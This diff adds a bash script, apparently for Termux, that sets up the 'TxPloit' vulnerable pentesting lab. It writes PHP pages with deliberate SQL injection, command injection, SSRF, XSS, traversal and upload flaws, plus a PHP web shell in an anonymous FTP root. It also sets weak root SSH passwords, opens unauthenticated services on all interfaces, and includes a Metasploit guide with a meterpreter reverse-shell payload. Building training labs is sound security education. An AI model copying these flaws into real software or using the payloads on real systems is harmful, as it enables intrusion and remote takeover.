@@ -1,0 +1,762 @@
+#!/data/data/com.termux/files/usr/bin/bash
+
+# TxPloit - Comprehensive Vulnerable Pentesting Lab
+# Created by h4xan for black Bird CyberSec
+# Version 3.0 - Web Vulnerability Expansion
+
+# Official TxPloit Banner
+function show_banner() {
+    clear
+    echo -e "\e[1;31m"
+    echo ' ████████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗'
+    echo ' ╚══██╔══╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝'
+    echo '    ██║    ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   '
+    echo '    ██║    ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   '
+    echo '    ██║   ██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   '
+    echo '    ╚═╝   ╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   '
+    echo -e "\e[0m"
+    echo -e "\e[1;37mblack Bird CyberSec | Created by h4xan\e[0m"
+    echo -e "\e[1;33m================================================\e[0m"
+    echo -e "\e[1;36m[!] Legal Notice: For educational purposes only.\e[0m"
+    echo -e "\e[1;36m[!] Unauthorized access is illegal. Always obtain\e[0m"
+    echo -e "\e[1;36m[!] written permission before security testing.\e[0m"
+    echo -e "\e[1;33m================================================\e[0m"
+}
+
+# Configuration
+FTP_PORT=2121
+SSH_PORT=2222
+HTTP_PORT=8080
+REDIS_PORT=6379
+SMB_PORT=445
+LOG_DIR="$HOME/txploit_logs"
+CONF_DIR="$HOME/txploit_configs"
+SERVICES_PID="$CONF_DIR/services.pid"
+CRED_FILE="$CONF_DIR/credentials.txt"
+
+# Create directories
+mkdir -p "$LOG_DIR" "$CONF_DIR" "$CONF_DIR/www" "$CONF_DIR/ftproot" \
+    "$CONF_DIR/www/vulns" "$CONF_DIR/www/vulns/ssrf" "$CONF_DIR/www/vulns/xss" \
+    "$CONF_DIR/www/vulns/idor" "$CONF_DIR/www/vulns/bruteforce" \
+    "$CONF_DIR/www/vulns/sqli" "$CONF_DIR/www/vulns/cmdi" \
+    "$CONF_DIR/www/vulns/upload" "$CONF_DIR/www/vulns/ssti" \
+    "$CONF_DIR/www/vulns/traversal"
+
+# Check if services are already running
+function check_running() {
+    if [ -f "$SERVICES_PID" ]; then
+        echo -e "\e[1;31m[!] Services are already running. Stop them first with './txploit stop'\e[0m"
+        exit 1
+    fi
+}
+
+# Python-based vulnerable FTP server
+function start_ftp() {
+    echo -e "\e[1;33m[+] Starting vulnerable FTP server on port $FTP_PORT...\e[0m"
+    
+    # Create FTP script
+    cat > "$CONF_DIR/ftp_server.py" << EOF
+from pyftpdlib.authorizers import DummyAuthorizer
+from pyftpdlib.handlers import FTPHandler
+from pyftpdlib.servers import FTPServer
+
+authorizer = DummyAuthorizer()
+authorizer.add_anonymous("$CONF_DIR/ftproot", perm="elradfmw")
+
+handler = FTPHandler
+handler.authorizer = authorizer
+handler.banner = "TxPloit Vulnerable FTP Server"
+
+server = FTPServer(('0.0.0.0', $FTP_PORT), handler)
+server.serve_forever()
+EOF
+
+    # Start FTP server in background
+    python "$CONF_DIR/ftp_server.py" &> "$LOG_DIR/ftp.log" &
+    FTP_PID=$!
+    echo "FTP running with PID $FTP_PID" >> "$SERVICES_PID"
+    
+    # Create test files
+    echo "TxPloit FTP Test File" > "$CONF_DIR/ftproot/test.txt"
+    echo "<?php system(\$_GET['cmd']); ?>" > "$CONF_DIR/ftproot/shell.php"
+    echo "Flag: FTP_{4n0nym0u5_wr1t3_4cc355}" > "$CONF_DIR/ftproot/flag.txt"
+    
+    sleep 2
+}
+
+# Create web vulnerabilities
+function create_web_vulnerabilities() {
+    # Main index with vulnerability listing
+    cat > "$CONF_DIR/www/index.php" << 'EOF'
+<?php
+// Main TxPloit Vulnerable Web Server
+echo '<!DOCTYPE html><html><head><title>TxPloit Vulnerable Web Server</title>';
+echo '<style>body {font-family: Arial, sans-serif; background: #111; color: #f1f1f1; padding: 20px;}';
+echo 'h1 {color: #e74c3c;} .vuln-card {background: #222; padding: 15px; margin: 10px 0; border-radius: 5px;}';
+echo 'a {color: #3498db; text-decoration: none;} .level {display: inline-block; padding: 3px 8px; border-radius: 3px; font-size: 0.8em;}';
+echo '.basic {background: #2ecc71;} .intermediate {background: #f39c12;}</style></head><body>';
+echo '<h1>TxPloit Vulnerable Web Server</h1>';
+echo '<p>Explore various web vulnerabilities:</p>';
+
+// Vulnerability list with descriptions and difficulty levels
+$vulnerabilities = [
+    'ssrf' => ['Server-Side Request Forgery', 'Access internal resources'],
+    'xss' => ['Cross-Site Scripting', 'Inject malicious scripts'],
+    'idor' => ['Insecure Direct Object Reference', 'Access unauthorized resources'],
+    'bruteforce' => ['Bruteforce Login', 'Crack password hashes'],
+    'sqli' => ['SQL Injection', 'Extract database information'],
+    'cmdi' => ['Command Injection', 'Execute system commands'],
+    'upload' => ['File Upload', 'Upload malicious files'],
+    'ssti' => ['Server-Side Template Injection', 'Execute code via templates'],
+    'traversal' => ['Path Traversal', 'Access sensitive files']
+];
+
+foreach ($vulnerabilities as $vuln => $info) {
+    echo "<div class='vuln-card'>";
+    echo "<h2>{$info[0]} - $vuln</h2>";
+    echo "<p>{$info[1]}</p>";
+    echo "<p><a href='/vulns/$vuln/basic.php'><span class='level basic'>Basic</span></a> | ";
+    echo "<a href='/vulns/$vuln/intermediate.php'><span class='level intermediate'>Intermediate</span></a></p>";
+    echo "</div>";
+}
+
+echo '</body></html>';
+EOF
+
+    # Create SSRF vulnerabilities
+    cat > "$CONF_DIR/www/vulns/ssrf/basic.php" << 'EOF'
+<?php
+// Basic SSRF Vulnerability
+echo "<h2>Basic SSRF</h2>";
+if (isset($_GET['url'])) {
+    $url = $_GET['url'];
+    $content = file_get_contents($url);
+    echo "<pre>" . htmlspecialchars($content) . "</pre>";
+} else {
+    echo "<form method='GET'>
+        URL: <input type='text' name='url' value='http://example.com'>
+        <input type='submit' value='Fetch'>
+    </form>";
+    echo "<p>Try: http://internal-service/secret.txt</p>";
+}
+EOF
+
+    cat > "$CONF_DIR/www/vulns/ssrf/intermediate.php" << 'EOF'
+<?php
+// Intermediate SSRF Vulnerability
+echo "<h2>Intermediate SSRF</h2>";
+if (isset($_GET['url'])) {
+    $url = $_GET['url'];
+    // "Filter" that can be bypassed
+    if (strpos($url, 'internal') !== false) {
+        $content = file_get_contents($url);
+        echo "<pre>" . htmlspecialchars($content) . "</pre>";
+    } else {
+        echo "Error: Only internal services allowed!";
+    }
+} else {
+    echo "<form method='GET'>
+        URL: <input type='text' name='url' value='http://internal-service/secret.txt'>
+        <input type='submit' value='Fetch'>
+    </form>";
+    echo "<p>Hint: Try bypassing the filter with http://internal@external.com</p>";
+}
+EOF
+
+    # Create XSS vulnerabilities
+    cat > "$CONF_DIR/www/vulns/xss/basic.php" << 'EOF'
+<?php
+// Basic XSS Vulnerability
+echo "<h2>Basic XSS</h2>";
+if (isset($_GET['search'])) {
+    echo "Results for: " . $_GET['search'];
+} else {
+    echo '<form method="GET">
+        Search: <input type="text" name="search">
+        <input type="submit" value="Search">
+    </form>';
+    echo '<p>Try: &lt;script&gt;alert(1)&lt;/script&gt;</p>';
+}
+EOF
+
+    cat > "$CONF_DIR/www/vulns/xss/intermediate.php" << 'EOF'
+<?php
+// Intermediate XSS Vulnerability
+echo "<h2>Intermediate XSS</h2>";
+if (isset($_GET['search'])) {
+    $search = $_GET['search'];
+    // Basic filtering that can be bypassed
+    $search = str_replace('<script>', '', $search);
+    echo "Results for: " . $search;
+} else {
+    echo '<form method="GET">
+        Search: <input type="text" name="search">
+        <input type="submit" value="Search">
+    </form>';
+    echo '<p>Hint: Try &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</p>';
+}
+EOF
+
+    # Create IDOR vulnerabilities
+    cat > "$CONF_DIR/www/vulns/idor/basic.php" << 'EOF'
+<?php
+// Basic IDOR Vulnerability
+echo "<h2>Basic IDOR</h2>";
+$users = [
+    1 => ['name' => 'Admin', 'email' => 'admin@txploit.local'],
+    2 => ['name' => 'User', 'email' => 'user@txploit.local'],
+    3 => ['name' => 'Guest', 'email' => 'guest@txploit.local']
+];
+
+if (isset($_GET['id'])) {
+    $id = (int)$_GET['id'];
+    if (isset($users[$id])) {
+        echo "<pre>User ID: $id\n";
+        echo "Name: " . $users[$id]['name'] . "\n";
+        echo "Email: " . $users[$id]['email'] . "</pre>";
+    } else {
+        echo "User not found!";
+    }
+} else {
+    echo '<p>Your profile: <a href="?id=2">View</a></p>';
+    echo '<p>Try changing the ID parameter to access other profiles</p>';
+}
+EOF
+
+    cat > "$CONF_DIR/www/vulns/idor/intermediate.php" << 'EOF'
+<?php
+// Intermediate IDOR Vulnerability
+echo "<h2>Intermediate IDOR</h2>";
+$users = [
+    'a1b2c3' => ['name' => 'Admin', 'email' => 'admin@txploit.local', 'role' => 'admin'],
+    'd4e5f6' => ['name' => 'User', 'email' => 'user@txploit.local', 'role' => 'user'],
+    'g7h8i9' => ['name' => 'Guest', 'email' => 'guest@txploit.local', 'role' => 'guest']
+];
+
+if (isset($_GET['token'])) {
+    $token = $_GET['token'];
+    if (isset($users[$token])) {
+        echo "<pre>User Token: $token\n";
+        echo "Name: " . $users[$token]['name'] . "\n";
+        echo "Email: " . $users[$token]['email'] . "\n";
+        echo "Role: " . $users[$token]['role'] . "</pre>";
+    } else {
+        echo "Invalid token!";
+    }
+} else {
+    echo '<p>Your profile: <a href="?token=d4e5f6">View</a></p>';
+    echo '<p>Try to find other valid tokens</p>';
+}
+EOF
+
+    # Create Bruteforce vulnerabilities
+    cat > "$CONF_DIR/www/vulns/bruteforce/basic.php" << 'EOF'
+<?php
+// Basic Bruteforce Vulnerability
+echo "<h2>Basic Bruteforce Login</h2>";
+$users = [
+    'admin' => 'password', // Plaintext password
+    'user' => '123456',
+    'test' => 'qwerty'
+];
+
+if (isset($_POST['username']) && isset($_POST['password'])) {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+    
+    if (isset($users[$username]) && $users[$username] === $password) {
+        echo "<h3 style='color:green'>Login Successful!</h3>";
+        echo "<pre>Welcome $username!\nPassword: $password</pre>";
+    } else {
+        echo "<h3 style='color:red'>Login Failed!</h3>";
+    }
+}
+
+echo '<form method="POST">
+    Username: <input type="text" name="username"><br>
+    Password: <input type="password" name="password"><br>
+    <input type="submit" value="Login">
+</form>';
+EOF
+
+    cat > "$CONF_DIR/www/vulns/bruteforce/intermediate.php" << 'EOF'
+<?php
+// Intermediate Bruteforce Vulnerability
+echo "<h2>Intermediate Bruteforce Login</h2>";
+$users = [
+    'admin' => '5f4dcc3b5aa765d61d8327deb882cf99', // MD5: password
+    'user' => '7c6a180b36896a0a8c02787eeafb0e4c', // SHA1: password1
+    'test' => 'd8578edf8458ce06fbc5bb76a58c5ca4'  // MD5: qwerty
+];
+
+if (isset($_POST['username']) && isset($_POST['password'])) {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+    
+    $success = false;
+    $hash = '';
+    
+    if (isset($users[$username])) {
+        $hash = $users[$username];
+        // Check MD5
+        if (md5($password) === $hash) {
+            $success = true;
+        }
+        // Check SHA1
+        elseif (sha1($password) === $hash) {
+            $success = true;
+        }
+    }
+    
+    if ($success) {
+        echo "<h3 style='color:green'>Login Successful!</h3>";
+        echo "<pre>Welcome $username!\nPassword Hash: $hash</pre>";
+        echo "<h4>Cracking Challenge:</h4>";
+        echo "<p>Try to crack these hashes:</p>";
+        echo "<ul>
+            <li>MD5: 5f4dcc3b5aa765d61d8327deb882cf99</li>
+            <li>SHA1: 7c6a180b36896a0a8c02787eeafb0e4c</li>
+            <li>Custom: d8578edf8458ce06fbc5bb76a58c5ca4</li>
+        </ul>";
+    } else {
+        echo "<h3 style='color:red'>Login Failed!</h3>";
+    }
+}
+
+echo '<form method="POST">
+    Username: <input type="text" name="username"><br>
+    Password: <input type="password" name="password"><br>
+    <input type="submit" value="Login">
+</form>';
+EOF
+
+    # Create SQL Injection vulnerabilities
+    cat > "$CONF_DIR/www/vulns/sqli/basic.php" << 'EOF'
+<?php
+// Basic SQL Injection Vulnerability
+echo "<h2>Basic SQL Injection</h2>";
+
+if (isset($_GET['search'])) {
+    $search = $_GET['search'];
+    $db = new SQLite3(':memory:');
+    $db->exec("CREATE TABLE users(id INTEGER PRIMARY KEY, username TEXT, password TEXT)");
+    $db->exec("INSERT INTO users(username, password) VALUES('admin', 's3cr3t')");
+    $db->exec("INSERT INTO users(username, password) VALUES('user', 'p@ssw0rd')");
+    
+    $result = $db->query("SELECT * FROM users WHERE username = '$search'");
+    
+    echo "<h3>Results:</h3>";
+    while ($row = $result->fetchArray()) {
+        echo "ID: {$row['id']}, User: {$row['username']}, Pass: {$row['password']}<br>";
+    }
+} else {
+    echo '<form method="GET">
+        Search user: <input type="text" name="search" value="admin">
+        <input type="submit" value="Search">
+    </form>';
+    echo '<p>Try: <code>\' OR 1=1--</code></p>';
+}
+EOF
+
+    cat > "$CONF_DIR/www/vulns/sqli/intermediate.php" << 'EOF'
+<?php
+// Intermediate SQL Injection Vulnerability
+echo "<h2>Intermediate SQL Injection</h2>";
+
+if (isset($_GET['search'])) {
+    $search = $_GET['search'];
+    $db = new SQLite3(':memory:');
+    $db->exec("CREATE TABLE users(id INTEGER PRIMARY KEY, username TEXT, password TEXT)");
+    $db->exec("INSERT INTO users(username, password) VALUES('admin', '".md5('s3cr3t')."')");
+    $db->exec("INSERT INTO users(username, password) VALUES('user', '".md5('p@ssw0rd')."')");
+    
+    // Some basic filtering
+    $search = str_replace("'", "''", $search);
+    $result = $db->query("SELECT * FROM users WHERE username = '$search'");
+    
+    echo "<h3>Results:</h3>";
+    while ($row = $result->fetchArray()) {
+        echo "ID: {$row['id']}, User: {$row['username']}, Pass: {$row['password']}<br>";
+    }
+    
+    if ($result->fetchArray() === false) {
+        echo "<p>No results found</p>";
+    }
+} else {
+    echo '<form method="GET">
+        Search user: <input type="text" name="search" value="admin">
+        <input type="submit" value="Search">
+    </form>';
+    echo '<p>Hint: Try <code>\' OR 1=1--</code> or time-based techniques</p>';
+}
+EOF
+
+    # Create Command Injection vulnerabilities
+    cat > "$CONF_DIR/www/vulns/cmdi/basic.php" << 'EOF'
+<?php
+// Basic Command Injection Vulnerability
+echo "<h2>Basic Command Injection</h2>";
+
+if (isset($_GET['host'])) {
+    $host = $_GET['host'];
+    echo "<pre>" . shell_exec("ping -c 4 $host") . "</pre>";
+} else {
+    echo '<form method="GET">
+        Host to ping: <input type="text" name="host" value="127.0.0.1">
+        <input type="submit" value="Ping">
+    </form>';
+    echo '<p>Try: 127.0.0.1; id</p>';
+}
+EOF
+
+    cat > "$CONF_DIR/www/vulns/cmdi/intermediate.php" << 'EOF'
+<?php
+// Intermediate Command Injection Vulnerability
+echo "<h2>Intermediate Command Injection</h2>";
+
+if (isset($_GET['host'])) {
+    $host = $_GET['host'];
+    // Basic filtering
+    $host = str_replace(';', '', $host);
+    $host = str_replace('&', '', $host);
+    $host = str_replace('|', '', $host);
+    
+    echo "<pre>" . shell_exec("ping -c 4 $host") . "</pre>";
+} else {
+    echo '<form method="GET">
+        Host to ping: <input type="text" name="host" value="127.0.0.1">
+        <input type="submit" value="Ping">
+    </form>';
+    echo '<p>Hint: Try using newlines or other bypass techniques</p>';
+}
+EOF
+
+    # Create File Upload vulnerabilities
+    cat > "$CONF_DIR/www/vulns/upload/basic.php" << 'EOF'
+<?php
+// Basic File Upload Vulnerability
+echo "<h2>Basic File Upload</h2>";
+
+if (isset($_FILES['file'])) {
+    $target = "uploads/" . basename($_FILES['file']['name']);
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
+        echo "File uploaded: <a href='$target'>$target</a>";
+    } else {
+        echo "Error uploading file!";
+    }
+}
+
+echo '<form method="POST" enctype="multipart/form-data">
+    Select file: <input type="file" name="file">
+    <input type="submit" value="Upload">
+</form>';
+EOF
+
+    cat > "$CONF_DIR/www/vulns/upload/intermediate.php" << 'EOF'
+<?php
+// Intermediate File Upload Vulnerability
+echo "<h2>Intermediate File Upload</h2>";
+
+if (isset($_FILES['file'])) {
+    $target = "uploads/" . basename($_FILES['file']['name']);
+    $fileType = strtolower(pathinfo($target, PATHINFO_EXTENSION));
+    
+    // Check file extension
+    if ($fileType != "jpg" && $fileType != "png") {
+        echo "Error: Only JPG/PNG files allowed!";
+    } else {
+        if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
+            echo "File uploaded: <a href='$target'>$target</a>";
+        } else {
+            echo "Error uploading file!";
+        }
+    }
+}
+
+echo '<form method="POST" enctype="multipart/form-data">
+    Select file: <input type="file" name="file">
+    <input type="submit" value="Upload">
+</form>';
+echo '<p>Hint: Try bypassing extension filters</p>';
+EOF
+
+    # Create SSTI vulnerabilities
+    cat > "$CONF_DIR/www/vulns/ssti/basic.php" << 'EOF'
+<?php
+// Basic SSTI Vulnerability
+echo "<h2>Basic SSTI</h2>";
+
+if (isset($_GET['name'])) {
+    $name = $_GET['name'];
+    echo "<p>Hello, $name!</p>";
+} else {
+    echo '<form method="GET">
+        Your name: <input type="text" name="name" value="Guest">
+        <input type="submit" value="Submit">
+    </form>';
+    echo '<p>Try: {{7*7}} in template engines (simulated)</p>';
+}
+EOF
+
+    cat > "$CONF_DIR/www/vulns/ssti/intermediate.php" << 'EOF'
+<?php
+// Intermediate SSTI Vulnerability
+echo "<h2>Intermediate SSTI</h2>";
+
+if (isset($_GET['template'])) {
+    $template = $_GET['template'];
+    // Simulated template rendering
+    echo "<p>Rendering template: $template</p>";
+    if (strpos($template, '{') !== false) {
+        echo "<p style='color:red'>Warning: Template contains potential dangerous characters!</p>";
+    }
+} else {
+    echo '<form method="GET">
+        Template: <input type="text" name="template" value="welcome.html">
+        <input type="submit" value="Render">
+    </form>';
+    echo '<p>Hint: Try template injection payloads</p>';
+}
+EOF
+
+    # Create Path Traversal vulnerabilities
+    cat > "$CONF_DIR/www/vulns/traversal/basic.php" << 'EOF'
+<?php
+// Basic Path Traversal Vulnerability
+echo "<h2>Basic Path Traversal</h2>";
+
+if (isset($_GET['file'])) {
+    $file = $_GET['file'];
+    echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
+} else {
+    echo '<form method="GET">
+        File to view: <input type="text" name="file" value="readme.txt">
+        <input type="submit" value="View">
+    </form>';
+    echo '<p>Try: ../../../../etc/passwd</p>';
+}
+EOF
+
+    cat > "$CONF_DIR/www/vulns/traversal/intermediate.php" << 'EOF'
+<?php
+// Intermediate Path Traversal Vulnerability
+echo "<h2>Intermediate Path Traversal</h2>";
+
+if (isset($_GET['file'])) {
+    $file = $_GET['file'];
+    // Basic filtering
+    $file = str_replace('../', '', $file);
+    echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
+} else {
+    echo '<form method="GET">
+        File to view: <input type="text" name="file" value="readme.txt">
+        <input type="submit" value="View">
+    </form>';
+    echo '<p>Hint: Try bypassing the ../ filter</p>';
+}
+EOF
+
+    # Create uploads directory
+    mkdir -p "$CONF_DIR/www/uploads"
+    echo "This is a test upload file" > "$CONF_DIR/www/uploads/test.txt"
+}
+
+# Start vulnerable services
+function start_services() {
+    show_banner
+    
+    echo -e "\e[1;32m[+] Initializing TxPloit vulnerable environment...\e[0m"
+    
+    # Save PID file
+    echo $$ > "$SERVICES_PID"
+    
+    # Create web vulnerabilities
+    create_web_vulnerabilities
+    
+    # Start FTP service
+    start_ftp
+    
+    # Start SSH service
+    echo -e "\e[1;33m[+] Starting vulnerable SSH on port $SSH_PORT...\e[0m"
+    cat > "$CONF_DIR/sshd_config" << EOF
+Port $SSH_PORT
+PermitRootLogin yes
+PasswordAuthentication yes
+AllowUsers root
+EOF
+    # Create weak credentials
+    echo "root:password" | chpasswd &>/dev/null
+    echo "admin:admin123" | chpasswd &>/dev/null
+    echo "user:letmein" | chpasswd &>/dev/null
+    ssh-keygen -A -f $HOME &>/dev/null
+    /usr/sbin/sshd -f "$CONF_DIR/sshd_config" -o "PidFile=$CONF_DIR/sshd.pid" &> "$LOG_DIR/sshd.log" &
+    echo "SSHD running with PID $!" >> "$SERVICES_PID"
+    sleep 1
+    
+    # Start HTTP service
+    echo -e "\e[1;33m[+] Starting vulnerable HTTP server on port $HTTP_PORT...\e[0m"
+    php -S 0.0.0.0:$HTTP_PORT -t "$CONF_DIR/www" &> "$LOG_DIR/httpd.log" &
+    echo "HTTP running with PID $!" >> "$SERVICES_PID"
+    sleep 1
+    
+    # Start Redis service
+    echo -e "\e[1;33m[+] Starting vulnerable Redis on port $REDIS_PORT...\e[0m"
+    redis-server --port $REDIS_PORT &> "$LOG_DIR/redis.log" &
+    echo "Redis running with PID $!" >> "$SERVICES_PID"
+    sleep 1
+    
+    # Start vulnerable SMB service
+    echo -e "\e[1;33m[+] Starting vulnerable SMB server on port $SMB_PORT...\e[0m"
+    cat > "$CONF_DIR/smb_server.py" << EOF
+from smb.SMBServer import SMBServer
+server = SMBServer(("0.0.0.0", $SMB_PORT), allow_anonymous=True)
+server.serve_forever()
+EOF
+    python "$CONF_DIR/smb_server.py" &> "$LOG_DIR/smb.log" &
+    echo "SMB running with PID $!" >> "$SERVICES_PID"
+    
+    # Get IP address for local network access
+    IP_ADDR=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n1)
+    
+    # Create credentials file
+    echo -e "TxPloit Vulnerable Service Credentials\n" > "$CRED_FILE"
+    echo "SSH: root:password" >> "$CRED_FILE"
+    echo "SSH: admin:admin123" >> "$CRED_FILE"
+    echo "SSH: user:letmein" >> "$CRED_FILE"
+    echo "FTP: anonymous:anypassword" >> "$CRED_FILE"
+    echo "Redis: no authentication" >> "$CRED_FILE"
+    echo "SMB: anonymous access" >> "$CRED_FILE"
+    echo "Web Admin: admin:s3cr3t" >> "$CRED_FILE"
+    
+    # Display connection information
+    echo -e "\e[1;32m\n[+] TxPloit services started successfully!\e[0m"
+    echo -e "\e[1;33m================================================\e[0m"
+    echo -e "\e[1;36m[+] Service Information:\e[0m"
+    echo -e "FTP   : \e[1;32mftp://localhost:$FTP_PORT\e[0m (anonymous)"
+    echo -e "      : \e[1;32mftp://$IP_ADDR:$FTP_PORT\e[0m"
+    echo -e "SSH   : \e[1;32mssh root@localhost -p $SSH_PORT\e[0m (password: password)"
+    echo -e "      : \e[1;32mssh root@$IP_ADDR -p $SSH_PORT\e[0m"
+    echo -e "HTTP  : \e[1;32mhttp://localhost:$HTTP_PORT\e[0m"
+    echo -e "      : \e[1;32mhttp://$IP_ADDR:$HTTP_PORT\e[0m"
+    echo -e "Redis : \e[1;32mredis-cli -h localhost -p $REDIS_PORT\e[0m"
+    echo -e "      : \e[1;32mredis-cli -h $IP_ADDR -p $REDIS_PORT\e[0m"
+    echo -e "SMB   : \e[1;32msmb://localhost\e[0m"
+    echo -e "      : \e[1;32msmb://$IP_ADDR\e[0m"
+    echo -e "\e[1;33m================================================\e[0m"
+    echo -e "\e[1;35m[!] Credentials saved to: $CRED_FILE\e[0m"
+    echo -e "\e[1;35m[!] Important: For local use only - DO NOT expose!\e[0m"
+    echo -e "\e[1;35m[!] Stop services with: ./txploit stop\e[0m"
+    echo -e "\e[1;33m================================================\e[0m"
+    echo -e "\e[1;32m[+] Web vulnerabilities available at:\e[0m"
+    echo -e "  - SSRF: \e[1;32mhttp://$IP_ADDR:$HTTP_PORT/vulns/ssrf/basic.php\e[0m"
+    echo -e "  - XSS: \e[1;32mhttp://$IP_ADDR:$HTTP_PORT/vulns/xss/intermediate.php\e[0m"
+    echo -e "  - IDOR: \e[1;32mhttp://$IP_ADDR:$HTTP_PORT/vulns/idor/basic.php\e[0m"
+    echo -e "  - Bruteforce: \e[1;32mhttp://$IP_ADDR:$HTTP_PORT/vulns/bruteforce/intermediate.php\e[0m"
+    echo -e "  - SQLi: \e[1;32mhttp://$IP_ADDR:$HTTP_PORT/vulns/sqli/basic.php\e[0m"
+    echo -e "  - CMDi: \e[1;32mhttp://$IP_ADDR:$HTTP_PORT/vulns/cmdi/intermediate.php\e[0m"
+    echo -e "  - File Upload: \e[1;32mhttp://$IP_ADDR:$HTTP_PORT/vulns/upload/basic.php\e[0m"
+    echo -e "  - SSTI: \e[1;32mhttp://$IP_ADDR:$HTTP_PORT/vulns/ssti/intermediate.php\e[0m"
+    echo -e "  - Path Traversal: \e[1;32mhttp://$IP_ADDR:$HTTP_PORT/vulns/traversal/basic.php\e[0m"
+    echo -e "\e[1;33m================================================\e[0m"
+}
+
+# Stop all services
+function stop_services() {
+    show_banner
+    
+    if [ ! -f "$SERVICES_PID" ]; then
+        echo -e "\e[1;31m[!] No running services found\e[0m"
+        return
+    fi
+    
+    echo -e "\e[1;31m[+] Stopping all TxPloit services...\e[0m"
+    
+    # Kill all services
+    while read -r line; do
+        if [[ $line == *"running with PID"* ]]; then
+            pid=$(echo $line | awk '{print $NF}')
+            kill -9 $pid &>/dev/null
+            echo "Stopped PID $pid"
+        fi
+    done < "$SERVICES_PID"
+    
+    # Remove PID file
+    rm -f "$SERVICES_PID"
+    echo -e "\e[1;32m[+] All services stopped successfully!\e[0m"
+}
+
+# Install dependencies
+function install_deps() {
+    show_banner
+    echo -e "\e[1;32m[+] Installing required packages...\e[0m"
+    
+    pkg update -y
+    pkg upgrade -y
+    pkg install -y python openssh redis php php-apache sqlite libffi libjpeg-turbo
+
+    # Install Python dependencies
+    pip install pyftpdlib pysmb
+    
+    echo -e "\e[1;32m\n[+] Installation complete!\e[0m"
+    echo -e "\e[1;33m[+] Start TxPloit with: ./txploit start\e[0m"
+}
+
+# Metasploit exploitation guide
+function metasploit_guide() {
+    show_banner
+    echo -e "\e[1;32m[+] TxPloit Metasploit Exploitation Guide\e[0m"
+    echo -e "\e[1;33m================================================\e[0m"
+    echo -e "\e[1;36m1. SSH Bruteforce:\e[0m"
+    echo "   use auxiliary/scanner/ssh/ssh_login"
+    echo "   set RHOSTS [TARGET_IP]"
+    echo "   set RPORT $SSH_PORT"
+    echo "   set USERNAME root"
+    echo "   set PASSWORD password"
+    echo "   run"
+    echo ""
+    echo -e "\e[1;36m2. Redis Unauthorized Access:\e[0m"
+    echo "   use exploit/linux/redis/redis_unauth_exec"
+    echo "   set RHOSTS [TARGET_IP]"
+    echo "   set RPORT $REDIS_PORT"
+    echo "   set SRVHOST [YOUR_IP]"
+    echo "   run"
+    echo ""
+    echo -e "\e[1;36m3. Web Exploitation:\e[0m"
+    echo "   Generate payload:"
+    echo "   msfvenom -p php/meterpreter/reverse_tcp LHOST=[YOUR_IP] LPORT=4444 -f raw > shell.php"
+    echo "   Upload via http://[TARGET_IP]:$HTTP_PORT/vulns/upload/basic.php"
+    echo "   Start handler:"
+    echo "   use exploit/multi/handler"
+    echo "   set payload php/meterpreter/reverse_tcp"
+    echo "   set LHOST [YOUR_IP]"
+    echo "   run"
+    echo ""
+    echo -e "\e[1;33m================================================\e[0m"
+    echo -e "\e[1;35m[!] Start services first to test exploitation!\e[0m"
+}
+
+# Main script execution
+case "$1" in
+    start)
+        check_running
+        start_services
+        ;;
+    stop)
+        stop_services
+        ;;
+    install)
+        install_deps
+        ;;
+    msf)
+        metasploit_guide
+        ;;
+    *)
+        show_banner
+        echo -e "\e[1;33mUsage: $0 {start|stop|install|msf}\e[0m"
+        echo -e "\e[1;33mInstall: Installs required dependencies"
+        echo -e "Start  : Launches all vulnerable services"
+        echo -e "Stop   : Terminates all running services"
+        echo -e "Msf    : Shows Metasploit exploitation guide\e[0m"
+        echo -e "\n\e[1;31mWARNING: For educational purposes only. Unauthorized access is illegal.\e[0m"
+        exit 1
+esac
